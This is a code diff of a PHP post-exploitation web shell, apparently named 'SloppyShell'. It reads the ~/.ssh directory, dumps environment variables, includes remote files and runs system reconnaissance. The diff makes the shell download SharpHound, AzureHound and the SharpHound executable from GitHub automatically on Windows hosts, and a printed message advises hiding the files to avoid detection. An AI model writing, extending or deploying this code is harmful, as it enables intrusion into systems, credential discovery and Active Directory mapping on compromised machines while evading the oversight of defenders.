@@ -1,6 +1,7 @@
 <?php
 $base = 'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami';
 
+
 function banner(){
     
     echo("\033[33;40m .▄▄ · ▄▄▌         ▄▄▄· ▄▄▄· ▄· ▄▌    .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌   \033[0m\n");
@@ -220,6 +221,9 @@ function checkSystem()
     $os = array();
     if (substr(php_uname(), 0, 7) == 'Windows') {
         array_push($os, "Windows");
+        windows("bh", "dl");
+        windows("azh", "dl");
+        windows("bhe", "dl");
         return $os;
     } else {
         array_push($os,"Linux");
@@ -234,8 +238,6 @@ function showEnv($os)
             echo(shell_exec('env'));
         } elseif ($os == "Windows") {
             echo(shell_exec("SET"));
-            echo("Pulling down sharphound, PS1 version, this is default.\n");
-            windows("bh");
         } else {
             return null;
         }
@@ -309,20 +311,31 @@ function remoteFileInclude(string $targetFile)
     }
 }
 
-function windows($com){
-    if (!empty($com)){
-        switch (strtolower($com)){
-            case "bh":
-                echo("Pulling SharpHound..\n");
-                $bh_url = "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1";
-                shell_exec("Invoke-WebRequest -Uri ". $bh_url . " -OutFile af.ps1");
-                break;
-            case "azh":
-                echo("Pulling Azurehound...\n");
-                break;
-            case "bhe":
-                echo("Pulling Bloodhound Executable!\n");
-                break;
+function windows($com, $r){
+    if (!empty($com) && !empty($r)){
+        $cdir = dirname(__DIR__ . "\\" .PHP_EOL);
+        if ($r == "dl") {
+            echo("\nThis is quite noisy, you should make a hidden directory in order to hide these..\n");
+            switch (strtolower($com)) {
+                case "bh":
+                    echo("Pulling SharpHound..\n");
+                    shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile af.ps1");
+                    echo("\nFile downloaded to: ". $cdir . " af.ps1");
+                    break;
+                case "azh":
+                    echo("Pulling Azurehound...\n");
+                    shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile af1.ps1");
+                    echo("\nFile downloaded to: ". $cdir . " af1.ps1");
+                    break;
+                case "bhe":
+                    echo("Pulling Bloodhound Executable!\n");
+                    shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile af2.exe");
+                    echo("\nFile downloaded to: ". $cdir . " af2.ps1");
+                    break;
+            }
+        }else{
+            echo ("Future versions will have an execution phase.");
+
         }
     }
 }
